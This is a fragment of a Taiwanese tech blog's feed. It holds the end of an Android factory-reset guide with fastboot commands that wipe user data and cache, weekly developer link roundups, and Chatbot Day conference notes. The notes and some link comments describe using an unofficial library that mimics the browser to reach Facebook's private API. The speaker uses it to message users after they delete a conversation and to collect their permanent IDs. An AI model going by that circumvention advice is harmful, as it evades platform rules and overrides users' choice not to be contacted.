&lt;li&gt;For Arch Linux users: &lt;code&gt;$ sudo pacman -S android-tools&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Make sure your Android phone had already enable the &lt;code&gt;Developer Options&lt;/code&gt; and enable the USB Debugging via ADB.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let's go:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Connect your Android phone to your computer.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ adb devices&lt;/code&gt; make sure your phone is listed.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ adb reboot bootloader&lt;/code&gt; to reboot the Android to bootloader.  &lt;/li&gt;
&lt;li&gt;Wait until it reboot to bootloader.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo fastboot erase userdata&lt;/code&gt; to wipe all user data.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo fastboot erase cache&lt;/code&gt; to wipe all cache.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo fastboot reboot&lt;/code&gt; to reboot your phone.  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;And that's it, it works for me.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ adb --version  
Android Debug Bridge version &lt;span class="m"&gt;1&lt;/span&gt;.0.36  
Revision &lt;span class="m"&gt;7&lt;/span&gt;.1.2_r6  
&lt;/pre&gt;&lt;/div&gt;</summary><category term="android"></category><category term="adb"></category><category term="factory reset"></category></entry><entry><title>Y2017W17</title><link href="https://blog.m157q.tw/posts/2017/05/01/y2017w17/" rel="alternate"></link><published>2017-07-10T04:19:00+08:00</published><updated>2017-07-10T04:19:00+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-05-01:posts/2017/05/01/y2017w17/</id><summary type="html">&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Swordfish90/cool-retro-term"&gt;GitHub - Swordfish90/cool-retro-term: A good looking terminal emulator which mimics the old cathode display...&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;cool-retro-term is a terminal emulator which mimics the look and feel of the old cathode tube screens. It has been designed to be eye-candy, customizable, and reasonably lightweight.  This terminal emulator works under Linux and OSX and requires Qt 5.2 or higher.  &lt;/li&gt;
&lt;li&gt;這個畫面真的是有夠復古 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mitchellh/gox"&gt;mitchellh/gox: A dead simple, no frills Go cross compile tool&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Gox is a simple, no-frills tool for Go cross compilation that behaves a lot like standard go build. Gox will parallelize builds for multiple platforms. Gox will also build the cross-compilation toolchain for you.  To install Gox, please use go get.  &lt;/li&gt;
&lt;li&gt;支援挺多平台的，連 Plan9 都有，看起來頗方便。但沒有實際拿編出來的 binary 來用，不知道會不會動就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/pndurette/gTTS"&gt;GitHub - pndurette/gTTS: Module and command line utility to save spoken text to mp3 via the Google Text to Speech (TTS) API&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;on GitHub and clone it locally Make sure you write tests for new features or modify the existing ones if necessary Open a new Pull Request from your feature branch to the develop branch.  &lt;/li&gt;
&lt;li&gt;在 IThome 的 ChatBot Day 聽到 adr 分享的「孫子廣播電台」，這專案也挺有趣的，用 RPi 加麵包版還有喇叭，寫個 script 去爬自己的 Facebook 動態，然後用 gTTS 唸出來給阿公阿嬤聽，讓不會用智慧型手機的長輩也可以知道你的 Facebook 動態 XD  &lt;ul&gt;
&lt;li&gt;有提到花了一些時間在處理斷詞的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;才知道原來 Google 翻譯有 Python 的 module 可用，看來很多實況主的 donation 音效可能都是用這個做的。  &lt;/li&gt;
&lt;li&gt;但這個 module 每次都只能用一種語言，所以就無聊寫了個可以支援中英文的 script：&lt;a href="https://gist.github.com/M157q/71cd6a5d815ad10b467adeb7e08f563c"&gt;https://gist.github.com/M157q/71cd6a5d815ad10b467adeb7e08f563c&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Mimino666/langdetect"&gt;GitHub - Mimino666/langdetect: Port of Google's language-detection library to Python.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Port of Google's language-detection library (version from 03/03/2014) to Python.  Supported Python versions 2.6, 2.7, 3.x.  &lt;/li&gt;
&lt;li&gt;因為上面那個問題，想說看看有沒有 library 可以自動偵測語言，然後把語言的 ISO 直接餵給 gTTS 就可以有個萬用的翻譯，所以找到了這個。不過實際試用了一下發現不太準，雖然 README 有寫支援 zh-tw，不過我餵繁體中文進去得到的結果都是 ko。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://dbkaiser.github.io/linux/2013/10/30/vimc-s/"&gt;Vim 中键入 C_s 卡死&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Vim 中误操作 由于用惯了Emacs, 有时为了速度在其他服务器上用vi常常会按emacs的快捷键。当然vi往往会集成一些emacs的快捷键比如C-n C-p等等。但是还是有很多键是有其他意义的，而这个保存键就很容易按错。C-x C-s（通常emacs保存  &lt;/li&gt;
&lt;li&gt;最近用 Vim 的時候不知道為啥常常卡死，查了之後才發現是這個問題，按太快不小心按到 Ctrl+S，然後就按啥都沒反應了，還以為自己的 Vim 當了。  &lt;/li&gt;
&lt;li&gt;解法是按 Ctrl+Q 跳出 flow control 模式  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;facebook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Schmavery/facebook-chat-api"&gt;Schmavery/facebook-chat-api&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Facebook now has an official API for chat bots here. This API is still the only way to automate chat functionalities on a user account. We do this by emulating the browser. This means doing the exact same GET/POST requests and tricking Facebook into thinking we're accessing the website normally.  &lt;/li&gt;
&lt;li&gt;直接用 Facebook 使用者的帳號密碼登入，然後用 JavaScript 直接打 Private API 拿各種資料，還可以 listen，等同於可以拿來稍微加工一下就變成 API  &lt;/li&gt;
&lt;li&gt;在 IThome 的 ChatBot Day 聽到 Her/Him 的開發者 Howard 分享，用這個拿來繞過 Facebook Messenger Platform API 的限制，還可以拿到 Facebook 使用者的 permanent ID，剛好最近工作上也遇到這個需求。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;music&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;原來金屬樂的唱腔還有分這麼多種，而且沒受過專業的訓練大概是真的唱不出來。  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://blow.streetvoice.com/11818-%E3%80%8C%E5%90%BC%E3%80%8D%E7%9A%84%E8%97%9D%E8%A1%93%EF%BC%9A%E5%A6%82%E4%BD%95%E5%8D%80%E5%88%86%E4%B8%8D%E5%90%8C%E9%A2%A8%E6%A0%BC%E7%9A%84%E5%98%B6%E5%90%BC%E5%94%B1%E8%85%94%EF%BC%9F/"&gt;「吼」的藝術：如何區分不同風格的嘶吼唱腔？ - Blow 吹音樂&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;歌唱的世界無比遼闊，任何一種風格都像萬花筒般蘊藏著七七四十九種變化！嘶吼是統稱，裡面還有好幾種唱法待你去研究探索，甚至是開發，心中怒氣值爆表的你究竟要選擇哪一種方式去吶喊呢？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.saydigi.com/2014/12/10-metal-vocal-styles.html"&gt;搖滾迷必看 三分鐘讓你瞭解10種金屬樂唱腔 - SayDigi | 點子生活&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;YouTube上的搖滾模仿紅人Jared Dines，在10月時錄製了一支有點搞笑，但卻又很實在影片。影片中用一首歌的方式，來模仿10種金屬風格的唱腔，了解各種金屬風格的朋友，一定馬上被點中笑穴並膜拜。如果你對金屬搖滾不了解，  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="github"></category><category term="golang"></category><category term="misc"></category><category term="music"></category><category term="python"></category><category term="vim"></category></entry><entry><title>iThome #Chatbot Day</title><link href="https://blog.m157q.tw/posts/2017/04/27/ithome-chatbot-day/" rel="alternate"></link><published>2017-04-27T21:06:00+08:00</published><updated>2017-04-27T21:06:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-04-27:posts/2017/04/27/ithome-chatbot-day/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;Event url: &lt;a href="http://chatbot.ithome.com.tw/"&gt;http://chatbot.ithome.com.tw/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Collaborative note: &lt;a href="https://hackpad.com/20170427-CHATBOT-DAY-NOTE-zblg5e45w3g"&gt;https://hackpad.com/20170427-CHATBOT-DAY-NOTE-zblg5e45w3g&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;突破 Facebook Messenger Platform API 限制&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Howard Chang  &lt;ul&gt;
&lt;li&gt;Her/Him 開發者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Facebook Messenger Platform API 在 Her/Him 上的應用實例&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Webview  &lt;ul&gt;
&lt;li&gt;讓 Messenger 的 UI 可以比較多樣與客製化  &lt;/li&gt;
&lt;li&gt;Facebook Login Webhook  &lt;/li&gt;
&lt;li&gt;讓使用者自己填寫資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Template  &lt;ul&gt;
&lt;li&gt;Generic Template  &lt;ul&gt;
&lt;li&gt;給使用者一些預設的聊天話題選項  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Button Template  &lt;ul&gt;
&lt;li&gt;玩猜拳  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;特殊的 Emoji 會觸發特效  &lt;ul&gt;
&lt;li&gt;目前已知：愛心、氣球、雪花  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;取得使用者的 FB ID 後，轉換成 Profile URL  &lt;ul&gt;
&lt;li&gt;正常來說應該做不到這件事  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Messenger Platform 的限制&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;24 小時內回覆的時間限制  &lt;ul&gt;
&lt;li&gt;超過 24 小時，只能再多發送一則訊息  &lt;/li&gt;
&lt;li&gt;有時候使用者一忙，可能超過 24 小時才回覆對方的訊息，如果不能突破這個限制，就無法讓使用者在超過 24 小時的回覆傳送到對方那邊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;無法取得使用者的 FB permanent ID  &lt;ul&gt;
&lt;li&gt;不能取得的話，雙方就無法交換 Facebook 的網址  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;無法傳送貼圖  &lt;ul&gt;
&lt;li&gt;透過 Messenger Platform 傳送的貼圖會變成靜態的圖片  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用者刪除對話後，就無法傳送任何訊息給他。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;如何突破限制&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;取得 Facebook permanent ID 的方法  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Schmavery/facebook-chat-api"&gt;Schmavery/facebook-chat-api&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;npm module  &lt;/li&gt;
&lt;li&gt;透過模擬 Facebook 網頁運作，直接存取 private API  &lt;/li&gt;
&lt;li&gt;可以突破限制，在任何時間傳送任何訊息給任何人  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以拿到使用者的 Facebook permanent ID  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;突破 24 小時內回覆的限制與使用者刪除訊息後仍然可以傳送訊息  &lt;ul&gt;
&lt;li&gt;用 facebook-chat-api 傳送訊息給使用者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如何傳送貼圖  &lt;ul&gt;
&lt;li&gt;用 facebook-chat-api 傳送 &lt;code&gt;sticker_id&lt;/code&gt; 給使用者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;今天覺得收穫最多的一場 talk，&lt;br /&gt;
主要是因為最近公司專案的關係都在寫 Facebook Messenger Bot，&lt;br /&gt;
然後這些的確都是在開發上會遇到的棘手問題。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Chatbot 智能溝通策略流程規劃與實作&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;AI  &lt;ul&gt;
&lt;li&gt;luis.ai, IBM Waston 支援繁體中文  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;據說 api.ai 也有支援繁體中文了，只是效果沒有那麼好。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;e-Commerce chatbot  &lt;ul&gt;
&lt;li&gt;手法  &lt;ul&gt;
&lt;li&gt;Push notification  &lt;ul&gt;
&lt;li&gt;傳送貼圖、優惠活動、限時特價  &lt;/li&gt;
&lt;li&gt;太常傳送且沒有打到使用者的點的話就很容易被封鎖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;產品使用後詢問、問卷回饋  &lt;/li&gt;
&lt;li&gt;使用者習性  &lt;ul&gt;
&lt;li&gt;預測使用者下次什麼時候會再購買一樣的日常用品  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;生日好禮  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用者流程  &lt;ul&gt;
&lt;li&gt;推薦商品、搜尋商品、熱門商品  &lt;/li&gt;
&lt;li&gt;查無商品、可能推薦商品  &lt;/li&gt;
&lt;li&gt;建議其他關鍵字  &lt;/li&gt;
&lt;li&gt;近期熱門活動、建議行動  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;用 Golang 打造 DevOps Bot&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: appleboy  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Projects  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;drone-line&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/appleboy/drone-line"&gt;https://github.com/appleboy/drone-line&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;drone-facebook&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/appleboy/drone-facebook"&gt;https://github.com/appleboy/drone-facebook&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CI/CD  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Gitlab  &lt;/li&gt;
&lt;li&gt;Jenkins  &lt;/li&gt;
&lt;li&gt;Drone  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 CLI Flag 參數  &lt;ul&gt;
&lt;li&gt;內建支援 CLI Flag  &lt;ul&gt;
&lt;li&gt;import "flag"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺點  &lt;ul&gt;
&lt;li&gt;不支援系統環境變數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 API Webhook  &lt;/li&gt;
&lt;li&gt;支援 HTTPS for WebHook Tunnel  &lt;ul&gt;
&lt;li&gt;ngrok  &lt;/li&gt;
&lt;li&gt;localtunnel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援自動更新 HTTPS 憑證  &lt;ul&gt;
&lt;li&gt;Trafik  &lt;ul&gt;
&lt;li&gt;Golang  &lt;/li&gt;
&lt;li&gt;支援自動更新憑證  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CADDY  &lt;ul&gt;
&lt;li&gt;Golang  &lt;/li&gt;
&lt;li&gt;原生支援 HTTPS  &lt;/li&gt;
&lt;li&gt;自動更新 Let's Encrypt 憑證  &lt;/li&gt;
&lt;li&gt;會幫你自動把 HTTP protocol 轉到 HTTPS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用一行 Golang 支援 HTTPS  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;http.Serve(autocert.NewListener("ecample.com", handler))&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://bit.ly/one-line-autotls"&gt;https://bit.ly/one-line-autotls&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;自動幫你跟 Let's Encrypt 要憑證  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援監控 Webhook 的功能  &lt;ul&gt;
&lt;li&gt;監控服務健康狀態  &lt;ul&gt;
&lt;li&gt;Memory usage, CPU usage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自訂監控數據，分析使用者訊息  &lt;/li&gt;
&lt;li&gt;統計報表  &lt;ul&gt;
&lt;li&gt;prometheus 資料格式  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://prometheus.io"&gt;https://prometheus.io&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Grafana  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://grafana.com"&gt;https://grafana.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援多種訊息格式  &lt;/li&gt;
&lt;li&gt;支援用 CLI 發送訊息  &lt;/li&gt;
&lt;li&gt;Golang 跨平台  &lt;ul&gt;
&lt;li&gt;Simple Go Cross Compilation  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gox&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mitchellh/gox"&gt;https://github.com/mitchellh/gox&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Windows 的支援沒問題  &lt;/li&gt;
&lt;li&gt;可以加上 flag 指定特定檔案只在某些 plafform 才 build  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Support ARM Platform  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援透過 Docker 發送訊息  &lt;ul&gt;
&lt;li&gt;需支援系統環境變數  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/urfave/cli"&gt;https://github.com/urfave/cli&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;lightweight  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/spf13/cobra"&gt;https://github.com/spf13/cobra&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自己的 Bug 自己解  &lt;ul&gt;
&lt;li&gt;只發送給原 Commit 作者，避免團隊成員收到太多無用的信件。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 Concurrent  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;go f("goroutine")&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 App 控制家電  &lt;ul&gt;
&lt;li&gt;Gorush - A push notification server written in golang  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/appleboy/gorush"&gt;https://github.com/appleboy/gorush&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最後講講為什麼使用 Golang  &lt;ul&gt;
&lt;li&gt;出身名門：Google  &lt;/li&gt;
&lt;li&gt;學習曲線：類似 C 語言  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;透過 Golang 無痛建置機器學習聊天機器人&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;projects  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kkdai/PetNeedMe"&gt;PetNeedMe&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Baby talk bot  &lt;ul&gt;
&lt;li&gt;LUIS.ai  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kkdai/luis"&gt;LUIS golang package&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;沒有 LUIS.ai 沒有 golang SDK 所以自己寫  &lt;/li&gt;
&lt;li&gt;目前還在開發中  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ASKME animal  &lt;ul&gt;
&lt;li&gt;TensorFlow  &lt;/li&gt;
&lt;li&gt;透過 TensorFlow 告訴你圖片中的動物名稱是什麼  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;透過這個 Template 可以在三分鐘內就在 Heroku 上架好一個 Line Bot  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kkdai/LineBotTemplate"&gt;https://github.com/kkdai/LineBotTemplate&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;孫子廣播電台：用 Linkit 7688 一鍵播放社交平台貼文&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/aaaddress1/grandsonRadio"&gt;https://github.com/aaaddress1/grandsonRadio&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;為了不會用智慧型手機卻又想關心自己的奶奶而做的小專案  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linkit 7688 + Python (gTTS) + 麵包板 + 一些電子元件 + 喇叭  &lt;ul&gt;
&lt;li&gt;大概新台幣一千元內有找  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;建立 Facebook Application  &lt;/li&gt;
&lt;li&gt;透過 Graph API 拿到貼文資訊：內容、發文時間、...等等  &lt;ul&gt;
&lt;li&gt;透過 Facebook 除錯工具來延長 otke  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;雖然這好像比較算是 IoT 應用而不是 Chatbot，&lt;br /&gt;
不過真的挺有趣的，&lt;br /&gt;
尤其是最近 &lt;a href="https://github.com/pndurette/gTTS"&gt;gTTS (Google Text-to-Speech)&lt;/a&gt; 因為狂新聞還有一堆實況主的 donate 音效很紅。（雖然我個人其實不太喜歡一直聽到 Google 小姐的聲音就是）&lt;br /&gt;
透過判別中英文來切開斷句，&lt;br /&gt;
因為 gTTS 產生的 mp3 每次只能限定某種語言。  &lt;/p&gt;</summary><category term="ChatBot"></category></entry><entry><title>Y2017W16</title><link href="https://blog.m157q.tw/posts/2017/04/24/y2017w16/" rel="alternate"></link><published>2017-07-10T03:54:06+08:00</published><updated>2017-07-10T03:54:06+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-04-24:posts/2017/04/24/y2017w16/</id><summary type="html">&lt;h3&gt;docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.docker.com/2017/04/introducing-linuxkit-container-os-toolkit/"&gt;Announcing LinuxKit: A Toolkit for building Secure, Lean and Portable Linux Subsystems - Docker Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/linuxkit/linuxkit"&gt;GitHub - linuxkit/linuxkit: A toolkit for building secure, portable and lean operating systems for containers&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;facebook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://caffe2.ai/blog/2017/04/18/caffe2-open-source-announcement.html"&gt;Caffe2 Open Source Brings Cross Platform Machine Learning Tools to Developers | Caffe2&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Training and deploying AI models is often associated with massive data centers or super computers, with good reason. The ability to continually process, create, and improve models from all kinds of information: images, video, text, and voice, at massive scale, is no small computing feat.  &lt;/li&gt;
&lt;li&gt;感覺有機會的話可以拿來用用看  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.facebook.com/blog/post/2017/04/18/messenger-platform-2.0/"&gt;Messenger Platform 2.0 Debuts at F8 - Facebook for Developers&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Today at F8, we introduced Messenger Platform 2.0, a new suite of tools that gives you the ability to build richer experiences, get discovered, and extend the conversational, visual and social capabilities of your bots. With more than 1.  &lt;/li&gt;
&lt;li&gt;真的更新的有夠快，一個月前才 1.4，現在已經 2.0 了，最大的改變大概是多了 extensions 吧，不過天知道台灣到底哪時候才能用 Payments  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/FacebookforDevelopers/videos/10154613896183553/"&gt;Live at our annual F8 developer conference. - Facebook for Developers&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;今年 F8 的影片  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gcpug-tw.gitbooks.io/google-cloud-platform-in-practice/content/"&gt;簡介 ‧ Google Cloud Platform In Practice&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCPUG.TW 出了一本關於 GCP 的書  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://help.github.com/articles/managing-notification-emails-for-organizations/"&gt;Managing notification emails for organizations - User Documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來我想要的功能早就有了，不同組織的通知可以綁定不同信箱，這樣工作跟個人的就不會混在一起了，竟然現在才知道，趕緊設定。  &lt;/li&gt;
&lt;li&gt;不過後來用了一下發現，有時候還是會因為不明原因，在個人的信箱收到公司 GitHub repo 的通知，然後 Travis 的通知好像沒地方可以設定，統一會寄信到 GitHub 的 primary email 的樣子。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@hoffa/the-top-github-projects-per-country-92c275e19409"&gt;The top GitHub projects per country – Felipe Hoffa – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個統計有點有趣，是拿 GCP 上的 GitHub Public dataset 用 BigQuery 來計算的，台灣也有在裏面，第 1 名的是求職天眼通。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://speakerdeck.com/poga/fuzz-testing-and-go-fuzz"&gt;Fuzz Testing and go-fuzz // Speaker Deck&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;iphone&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;最近買了 iPhone SE，所以看了一堆跟 iPhone 有關的有的沒的  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.51feibao.com/article-view-3784.html"&gt;利用iphone手機自帶包裝盒做支架 - 廢物利用手工DIY小製作 - 51費寶網&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;很多朋友把苹果手机买回家之后第一时间就是到配件市场上重新买手机支架，殊不知iphone自带的出厂包装本身就为我们提供了一个绝佳的diy手机支架方案。如果你之前没有留意到这种手机新玩法，那么一起来跟随51费宝这期的手  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
